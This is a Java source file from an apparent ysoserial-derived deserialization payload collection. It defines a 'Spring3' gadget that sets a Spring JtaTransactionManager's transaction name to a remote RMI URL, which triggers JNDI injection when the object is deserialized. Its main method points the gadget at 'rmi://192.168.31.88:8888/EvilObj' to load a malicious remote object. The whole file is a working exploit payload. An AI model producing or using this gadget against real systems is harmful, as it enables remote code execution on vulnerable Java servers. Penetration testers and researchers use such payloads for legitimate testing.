package ysoserial.payloads;

import org.springframework.transaction.jta.JtaTransactionManager;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

/**
 * Spring-tx JtxTransactionManager JNDI Injection
 *
 * @author wh1t3P1g
 * @since 2020/2/5
 */
@Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE","org.springframework:spring-context:5.2.3.RELEASE","javax.transaction:javax.transaction-api:1.2"})
@Authors({ Authors.WH1T3P1G })
public class Spring3 extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public Object getObject(String rmiURL) throws Exception {
        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(rmiURL);
        return manager;
    }

    public static void main(final String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","false");
        String[] args1 = new String[]{"rmi://192.168.31.88:8888/EvilObj"};
        PayloadRunner.run(Spring3.class, args1);
    }
}

